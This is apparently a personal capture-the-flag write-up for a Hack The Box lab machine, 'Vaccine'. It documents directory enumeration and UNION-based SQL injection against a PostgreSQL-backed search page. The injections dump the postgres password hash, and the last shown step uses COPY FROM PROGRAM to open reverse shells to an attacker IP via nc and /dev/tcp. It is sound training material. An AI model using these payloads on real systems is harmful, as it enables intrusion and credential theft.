# Vaccine (10.10.10.46) Apache
#vaccine
[[vaccine (10.10.10.46)]]
## Summary

## Procedure
1. GoBuster on root directory with common dirs
	```
	tyler@ubuntu:~/Documents/learn/htb/htb-starting-point/vaccine/artifacts$ gobuster dir -u http://localhost:8081/ -w /opt/SecLis
	ts-2021.2/Discovery/Web-Content/common.txt
	===============================================================
	Gobuster v3.1.0
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://localhost:8081/
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /opt/SecLists-2021.2/Discovery/Web-Content/common.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.1.0
	[+] Timeout:                 10s
	===============================================================
	2021/08/17 14:49:42 Starting gobuster in directory enumeration mode
	===============================================================
	/.htaccess            (Status: 403) [Size: 276]
	/.hta                 (Status: 403) [Size: 276]
	/.htpasswd            (Status: 403) [Size: 276]
	/index.php            (Status: 200) [Size: 2312]
	/server-status        (Status: 403) [Size: 276]

	===============================================================
	2021/08/17 14:51:16 Finished
	===============================================================
	```
2. Got SQL database to print error by searching for `'`
	```
	http://10.10.10.46/dashboard.php?search=%27
	
	ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%'%' ^
	```
	![[Pasted image 20210817151144.png]]
3. Got website to print database version
	```
	Search: ' UNION SELECT CAST(VERSION() AS INT),NULL,NULL,NULL,NULL--
	URL: http://10.10.10.46/dashboard.php?search=%27+UNION+SELECT+CAST%28version%28%29+AS+INT%29%2CNULL%2CNULL%2CNULL%2CNULL--
	Error: ERROR: invalid input syntax for integer: "PostgreSQL 11.5 (Ubuntu 11.5-1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.1.0-9ubuntu2) 9.1.0, 64-bit"
	```
	![[Pasted image 20210818100448.png]]
	- Database is `PostgreSQL 11.5 (Ubuntu 11.5-1)`
	- Operating System is `Ubuntu`
	- Table has 5 columns
	- [PortsWigger website](https://portswigger.net/web-security/sql-injection/examining-the-database) was very useful in finding this
4. Found database name
	```
	Search: ' UNION SELECT CAST(TABLE_CATALOG AS INT),NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES--
	URL: http://10.10.10.46/dashboard.php?search=%27+UNION+SELECT+CAST%28TABLE_CATALOG+AS+INT%29%2CNULL%2CNULL%2CNULL%2CNULL+FROM+INFORMATION_SCHEMA.TABLES--
	Error: ERROR: invalid input syntax for integer: "carsdb"
	```
	![[Pasted image 20210818102106.png]]
	- Database name is: `carsdb`
5. Found table name
	```
	Search: ' UNION SELECT CAST(TABLE_NAME AS INT),NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES--
	URL: http://10.10.10.46/dashboard.php?search=%27+UNION+SELECT+CAST%28TABLE_NAME+AS+INT%29%2CNULL%2CNULL%2CNULL%2CNULL+FROM+INFORMATION_SCHEMA.TABLES--
	Error: ERROR: invalid input syntax for integer: "cars"
	```
	![[Pasted image 20210818102224.png]]
	- Table name is: `cars`
6. Found website's db username
	```
	Search: ' UNION SELECT CAST(user AS INT),NULL,NULL,NULL,NULL--
	URL: http://10.10.10.46/dashboard.php?search=%27+UNION+SELECT+CAST%28user+AS+INT%29%2CNULL%2CNULL%2CNULL%2CNULL--
	Error: ERROR: invalid input syntax for integer: "postgres"
	```
	![[Pasted image 20210818102921.png]]
	- website's db user is `postgres`

7. Found `postgres` user's password hash
	```
	Search: ' UNION SELECT NULL,usename,passwd,NULL,NULL FROM pg_shadow--
	URL: http://10.10.10.46/dashboard.php?search=%27+UNION+SELECT+NULL%2Cusename%2Cpasswd%2CNULL%2CNULL+FROM+pg_shadow--
	Result: postgres, md52d58e0637ec1e94cdfba3d1c26b67d01
	```
	![[Pasted image 20210818105339.png]]
	- The pasword hash of `postgres` is `md52d58e0637ec1e94cdfba3d1c26b67d01`
8. Dumped all table names
	```
	Search: ' UNION SELECT NULL,table_name,NULL,NULL,NULL FROM information_schema.tables--
	URL: http://10.10.10.46/dashboard.php?search=%27+UNION+SELECT+NULL%2Ctable_name%2CNULL%2CNULL%2CNULL+FROM+information_schema.tables--
	Result: pg_init_privs,pg_stat_archiver,pg_inherits,_pg_foreign_servers,pg_stats,user_mappings,table_privileges,pg_auth_members,pg_stat_user_functions,pg_stat_wal_receiver,pg_am,columns,pg_seclabels,pg_rewrite,foreign_tables,pg_amproc,udt_privileges,pg_stat_progress_vacuum,pg_type,pg_ts_template,pg_stat_sys_tables,parameters,administrable_role_authorizations,_pg_foreign_data_wrappers,pg_tables,pg_opclass,pg_stat_database_conflicts,pg_stat_replication,pg_shdescription,foreign_server_options,pg_foreign_server,pg_attrdef,pg_namespace,pg_statio_sys_sequences,pg_stat_user_indexes,pg_statistic,pg_stat_xact_user_functions,pg_stat_xact_user_tables,pg_locks,pg_stat_subscription,column_options,routine_privileges,pg_policy,pg_cursors,pg_replication_origin_status,pg_config,applicable_roles,pg_aggregate,pg_available_extensions,pg_rules,pg_stat_xact_sys_tables,view_table_usage,pg_user,information_schema_catalog_name,pg_event_trigger,domain_constraints,column_udt_usage,sql_features,pg_stat_all_tables,check_constraint_routine_usage,pg_group,user_mapping_options,views,pg_prepared_xacts,triggered_update_columns,pg_statio_sys_tables,pg_matviews,pg_largeobject_metadata,pg_constraint,view_column_usage,foreign_data_wrapper_options,constraint_column_usage,check_constraints,pg_views,pg_stat_activity,pg_replication_origin,pg_conversion,_pg_user_mappings,pg_prepared_statements,pg_ts_dict,foreign_table_options,domain_udt_usage,pg_replication_slots,pg_depend,pg_statio_user_sequences,pg_description.pg_shadow,role_column_grants,pg_statistic_ext,pg_index,pg_foreign_table,table_constraints,pg_foreign_data_wrapper,pg_stat_bgwriter,pg_attribute,usage_privileges,domains,role_table_grants,column_domain_usage,collations,pg_stat_ssl,pg_class,pg_statio_sys_indexes,pg_transform,pg_db_role_setting,pg_amop,pg_ts_parser,pg_collation,pg_stat_sys_indexes,pg_publication_tables,pg_policies,pg_indexes,pg_subscription_rel,pg_sequences,pg_shdepend,role_usage_grants,pg_stat_user_tables,pg_cast,pg_publication_rel,pg_hba_file_rules,role_udt_grants,constraint_table_usagem,sql_sizing,_pg_foreign_tables,pg_enum,pg_settings,pg_statio_user_indexes,foreign_data_wrappers,pg_timezone_abbrevs,role_routine_grants,sql_packages,pg_tablespace,pg_ts_config,pg_ts_config_map,sql_parts,referential_constraints,routines,pg_proc,_pg_foreign_table_columns,view_routine_usage,sequences,pg_default_acl,pg_sequence,pg_seclabel,column_privileges,pg_database,pg_statio_user_tables,sql_sizing_profiles,sql_implementation_info,pg_opfamily,triggers,user_defined_types,tables,enabled_roles,collation_character_set_applicability,pg_range,pg_publication,pg_roles,data_type_privileges,attributes,pg_statio_all_tables,sql_languages,character_sets,pg_user_mapping,pg_partitioned_table,pg_stat_all_indexes,pg_file_settings,pg_timezone_names,pg_extension,pg_operator,pg_authid,pg_available_extension_versions,pg_statio_all_indexes,cars,pg_pltemplate,key_column_usage,pg_stat_database,pg_user_mappings,pg_stat_xact_all_tables,pg_trigger,pg_statio_all_sequences,transforms,foreign_servers,pg_subscription,pg_largeobject,pg_language, pg_shseclabel
	```
	![[Pasted image 20210818113548.png]]
9. Dumped all database names
	```
	Search: ' UNION SELECT NULL,datname,NULL,NULL,NULL FROM pg_database--
	URL: http://10.10.10.46/dashboard.php?search=%27+UNION+SELECT+NULL%2Cdatname%2CNULL%2CNULL%2CNULL+FROM+pg_database--
	Results: carsdb, postgres,template0,template1
	```
	![[Pasted image 20210818113722.png]]
10. Created a reverse shell with COPY command and busybox ncat
	```
	Search 1: ' ; CREATE TABLE twof(cmd_output text);--
	Search 2: ' ; COPY twof FROM PROGRAM 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.54 3602 >/tmp/f';--
	URL 1: http://10.10.10.46/dashboard.php?search=%27+%3B+CREATE+TABLE+twof%28cmd_output+text%29%3B--
	URL 2: http://10.10.10.46/dashboard.php?search=%27+%3B+COPY+twof+FROM+PROGRAM+%27%2Fbin%2Fbash+-l+%3E+%2Fdev%2Ftcp%2F10.10.15.54%2F3602+0%3C%261+2%3E%261+%26%27%3B--
	```
	![[Pasted image 20210818145409.png]]
